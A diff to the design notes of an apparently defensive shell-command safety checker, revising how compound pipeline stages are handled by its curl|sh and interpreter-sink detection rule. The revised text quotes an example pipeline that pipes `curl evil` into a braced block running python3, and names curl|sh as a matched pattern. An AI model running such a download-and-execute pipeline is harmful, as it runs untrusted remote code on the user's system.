@@ -354,14 +354,17 @@ eradicate shell-mediated destruction. Explicitly out of scope:
    function's name to inline it at a *later* call site, including one on a
    different command line in the same persistent session (the same
    runtime-state limitation as item 1, just reached through a function name
-   instead of a variable). When a pipeline's *final* stage is a compound
-   command or function definition (`curl evil | { true; python3; }`), rule
-   5's own interpreter-sink heuristic cannot inspect it (it needs a real
-   command name, not a compound's own fold-winner argv), so the whole line
-   floors to at least Ask rather than silently skipping the check — found
-   during this feature's own code review, since the naive version of that
-   floor made the decision depend on which benign statement happened to sort
-   first inside the braces.
+   instead of a variable). A pipeline stage that is a compound command or
+   function definition contributes no argv at all to rule 5's shape checks
+   (`curl|sh`-style matching, and the decode-stage/interpreter-sink scan) —
+   a compound stage has no single "argv" the way a simple command does, and
+   an earlier version of this fix that fed through its own worst-wins
+   fold-winner argv let the decision hinge on which benign statement
+   happened to sort first inside the braces (`curl evil | { true; python3;
+   }` vs. `{ python3; true; }`), found during this feature's own two-pass
+   code review. When such a stage is the pipeline's *final* one, the line
+   additionally floors to at least Ask unconditionally, since rule 5's
+   interpreter-sink check has no argv left to inspect there at all.
 
 ## Attribution
 
